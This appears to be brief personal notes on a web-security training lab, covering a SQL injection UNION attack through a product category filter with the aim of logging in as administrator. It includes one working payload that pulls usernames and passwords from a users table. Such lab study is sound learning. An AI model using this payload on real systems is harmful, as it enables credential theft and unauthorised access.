# Tenth Lab : SQL Injection

Lab - 10 : SQL injection UNION attack, retrieving data from other tables

SQL Injection : product category filter

Endgoal : Logging in as administrator

Analysis : 

1. SQL Injectability → True 
2. Retrieve data 
    
    ```
    Payload -> ' UNION SELECT username, password FROM users--
    ```
    
    ![vmplayer_09rhq7o6nL.png](Tenth%20Lab%20SQL%20Injection%2021a3c5d54c7680a18904e5a6e48f806b/vmplayer_09rhq7o6nL.png)